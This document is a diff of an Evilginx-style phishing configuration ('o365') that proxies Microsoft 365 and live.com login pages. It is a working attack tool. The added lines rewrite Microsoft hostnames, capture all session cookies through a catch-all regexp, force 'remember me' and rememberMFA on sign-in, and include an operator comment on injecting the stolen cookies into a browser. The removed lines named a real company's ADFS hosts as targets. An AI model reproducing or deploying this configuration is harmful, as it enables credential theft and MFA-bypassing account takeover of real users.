@@ -1,47 +1,113 @@
 name: 'o365'
-author: '@G66K ICQ: 747246257'
+author: '@An0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  # The lines below are needed if your target organization utilizes ADFS.
-  # If they do, you need to uncomment all following lines that contain <...>
-  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
-  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
-  #    <insert-adfs-subdomain> = adfs
-  #    <insert-adfs-host> = example.com
-  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
+  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}  
+  - {phish_sub: 'aadcdnn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false} 
+  - {phish_sub: 'res.cdn', orig_sub: 'res.cdn', domain: 'office.net', session: false, is_landing: false} 
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false}
 
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
-  - {phish_sub: 'adfs', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
-  - {phish_sub: 'adfs', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing:false}
-  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'woodhead-group.co.uk', session: true, is_landing:false}
-  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'woodhead-group.co.uk:443', session: true, is_landing:false}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'woodhead-group.co.uk', session: true, is_landing:false}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'woodhead-group.co.uk:443', session: true, is_landing:false}
-  - {phish_sub: 'sts', orig_sub: 'sts', domain: 'woodhead-group.co.uk', session: true, is_landing:false}
-  - {phish_sub: 'sts', orig_sub: 'sts', domain: 'woodhead-group.co.uk:443', session: true, is_landing:false}
-  - {phish_sub: 'idfs', orig_sub: 'sts', domain: 'woodhead-group.co.uk', session: true, is_landing:false}
-  - {phish_sub: 'idfs', orig_sub: 'sts', domain: 'woodhead-group.co.uk:443', session: true, is_landing:false}
 
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  # Uncomment and fill in if your target organization utilizes ADFS
-  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'adfs.woodhead-group.co.uk', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'sso.woodhead-group.co.uk', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'sts.woodhead-group.co.uk', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'idfs.woodhead-group.co.uk', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https%3A%2F%2F{hostname_regex}', replace: 'https%3A%2F%2F{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: '', domain: 'msftauth.net', search: '{domain_regex}', replace: '{domain_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '<https://{hostname}>', replace: '<https://{hostname}>', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'href="//{hostname}"', replace: 'href="//{hostname}"', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https%3A%2F%2F{hostname_regex}', replace: 'https%3A%2F%2F{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: '', domain: 'msauth.net', search: '{domain_regex}', replace: '{domain_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: '<https://{hostname}>', replace: '<https://{hostname}>', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'href="//{hostname}"', replace: 'href="//{hostname}"', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https%3A%2F%2Fwww.office.com', replace: 'https%3A%2F%2Fwww.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https%3A%2F%2Fwww.office.com', replace: 'https%3A%2F%2Fwww.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '', domain: 'microsoft.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: '', domain: 'microsoft.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: '', domain: 'office.com', search: '{domain_regex}', replace: '{domain_regexp}', mimes: ['text/html', 'application/json', 'application/javascript']}
+ 
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regex}/ppsecure/', replace: 'https://{hostname_regex}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regex}/GetCredentialType.srf', replace: 'https://{hostname_regex}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regex}/GetSessionState.srf', replace: 'https://{hostname_regex}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regex}/ppsecure/', replace: 'https://{hostname_regex}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regex}/GetCredentialType.srf', replace: 'https://{hostname_regex}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regex}/GetSessionState.srf', replace: 'https://{hostname_regex}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname_regex}/ppsecure/', replace: 'https://{hostname_regex}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname_regex}/GetCredentialType.srf', replace: 'https://{hostname_regex}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname_regex}/GetSessionState.srf', replace: 'https://{hostname_regex}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+  - {triggers_on: 'login.live.com', orig_sub: 'res.cdn', domain: 'office.net', search: 'https://{hostname_regex}', replace: 'https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'res.cdn', domain: 'office.net', search: '{hostname_regex}', replace: '{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'res.cdn', domain: 'office.net', search: 'href="https://{hostname_regex}', replace: 'href="https://{hostname_regex}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', '.*,regexp']
   - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['SignInStateCookie', '.*,regexp']
+  - domain: 'login.live.com'
+    keys: ['.*,regexp']    
+  - domain: '.login.live.com'
+    keys: ['.*,regexp']  
+  - domain: '.live.com'  
+    keys: ['.*,regexp']
+    
 auth_urls:
  - '/kmsi*'
+ - '/landingv2*'
+ - '/landing*'
+ - '/ppsecure/'
+ - '/ppsecure/*' 
+ 
+# - '/oauth20_authorize.srf*'
+
+# INJECT COOKIES
+# --------------
+# 
+# Browse the url https://login.microsoftonline.com
+# inject the capture cookies 
+# Refresh the browser
+
+
+
 credentials:
   username:
     key: '(login|UserName)'
@@ -54,23 +120,25 @@ credentials:
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
-js_inject:
-  - trigger_domains: ["www.domain.com"]
-    trigger_paths: ["/"]
-    script: |
-            function gimmesleep(ms) {
-              return new Promise(resolve => setTimeout(resolve, ms));
-            }
-            async function redir() {
-              await gimmesleep(2000);
-              window.location.href = "{rurl}";
-            }
-            redir()
+
+force_post:
+  - path: '/kmsi'
+    search: 
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search: 
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/oauth2/","/","/*"]
+    trigger_paths: ["/common/oauth2/","/","/*","/oauth20_authorize.srf"]
     script: |
-      function lp(){
+        function lp(){
         var emailId = document.querySelector("#i0116");
         var nextButton = document.querySelector("#idSIButton9");
         var query = window.location.href;
@@ -92,4 +160,4 @@ js_inject:
         }
         setTimeout(function(){lp();}, 1500);
       }
-      setTimeout(function(){lp();}, 1500); 
+      setTimeout(function(){lp();}, 1500);
